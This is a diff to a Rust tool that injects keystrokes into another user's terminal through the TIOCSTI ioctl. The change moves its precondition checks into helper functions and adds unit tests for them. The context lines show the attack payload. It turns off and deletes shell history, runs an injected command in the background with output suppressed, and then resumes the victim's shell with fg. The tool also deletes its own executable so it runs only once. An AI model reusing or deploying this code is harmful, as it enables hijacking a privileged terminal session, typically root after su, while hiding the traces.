@@ -12,7 +12,7 @@ use std::time::Duration;
 use std::{env, fs, thread};
 
 use anyhow::Context as _;
-use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill};
+use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill, pid_t, uid_t};
 
 /// First part of the payload to inject into the tty's input buffer.
 const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
@@ -27,32 +27,19 @@ const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 ///
 /// Returns an [`anyhow::Error`] if the `TIOCSTI` ioctl fails.
 pub fn run() -> anyhow::Result<()> {
-    // Check that we are not already root.
+    // Check that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
     // SAFETY: getuid() is safe to call
     let uid = unsafe { getuid() };
-    if uid == 0 {
-        anyhow::bail!("we are already root");
-    }
-
-    // Check that stdin refers to a terminal.
-    if !io::stdin().is_terminal() {
-        anyhow::bail!("stdin does not refer to a terminal");
-    }
-
-    // Check that we have a valid parent.
+    let is_tty = io::stdin().is_terminal();
     // SAFETY: getppid() is safe to call
     let parent_pid = unsafe { libc::getppid() };
-    if parent_pid <= 1 {
-        anyhow::bail!("invalid parent process id");
-    }
+    check_preconditions(uid, is_tty, parent_pid)?;
 
     // Check that we have a valid tty and that it does not have the same uid as us.
     let tty_path = fs::read_link(format!("/proc/self/fd/{STDIN_FILENO}"))
         .context("failed to resolve tty path")?;
     let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
-    if tty_metadata.uid() == uid {
-        anyhow::bail!("tty has the same uid as us");
-    }
+    check_tty_ownership(uid, tty_metadata.uid())?;
 
     // Only execute once: delete our own executable.
     let exe_path = env::current_exe().context("failed to resolve own executable path")?;
@@ -85,13 +72,34 @@ pub fn run() -> anyhow::Result<()> {
         tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
     }
 
-    // TODO: implement some unit (and maybe integration) tests, excluding tests that don't work in ci
-    // TODO: move initial checks to an external function?
+    // TODO: implement some integration tests, excluding tests that don't work in ci
     // TODO: update documentation to reflect changes (especially verbose/quiet mode) + how to add as a library to use in your own projects
     // TODO: publish on crates.io and enable semver checks in ci
     // TODO: final check of cargo doc --open
 
     // No need to SIGCONT here because `fg` in the payload does that for us.
+    Ok(())
+}
+
+/// Checks that we are not already root, that stdin refers to a terminal, and that we have a valid parent.
+fn check_preconditions(uid: uid_t, is_tty: bool, parent_pid: pid_t) -> anyhow::Result<()> {
+    if uid == 0 {
+        anyhow::bail!("we are already root");
+    }
+    if !is_tty {
+        anyhow::bail!("stdin does not refer to a terminal");
+    }
+    if parent_pid <= 1 {
+        anyhow::bail!("invalid parent process id");
+    }
+    Ok(())
+}
+
+/// Checks that the tty does not have the same uid as us.
+fn check_tty_ownership(uid: uid_t, tty_uid: uid_t) -> anyhow::Result<()> {
+    if tty_uid == uid {
+        anyhow::bail!("tty has the same uid as us");
+    }
     Ok(())
 }
 
@@ -175,6 +183,60 @@ mod tests {
     use libc::*;
 
     use super::*;
+
+    #[test]
+    fn check_preconditions_rejects_root() {
+        let result = check_preconditions(0, true, 100);
+
+        assert!(result.is_err(), "expected an error when uid is 0 (root)");
+    }
+
+    #[test]
+    fn check_preconditions_rejects_non_tty() {
+        let result = check_preconditions(1000, false, 100);
+
+        assert!(
+            result.is_err(),
+            "expected an error when stdin is not a terminal"
+        );
+    }
+
+    #[test]
+    fn check_preconditions_rejects_invalid_parent() {
+        let result = check_preconditions(1000, true, 1);
+
+        assert!(
+            result.is_err(),
+            "expected an error when the parent pid is invalid"
+        );
+    }
+
+    #[test]
+    fn check_preconditions_accepts_valid_state() {
+        let result = check_preconditions(1000, true, 100);
+
+        assert!(result.is_ok(), "expected valid state to pass the checks");
+    }
+
+    #[test]
+    fn check_tty_ownership_rejects_same_uid() {
+        let result = check_tty_ownership(1000, 1000);
+
+        assert!(
+            result.is_err(),
+            "expected an error when the tty has the same uid as us"
+        );
+    }
+
+    #[test]
+    fn check_tty_ownership_accepts_different_uid() {
+        let result = check_tty_ownership(1000, 0);
+
+        assert!(
+            result.is_ok(),
+            "expected a different tty uid to pass the check"
+        );
+    }
 
     #[test]
     fn tiocsti_inject_invalid_fd_returns_err() {
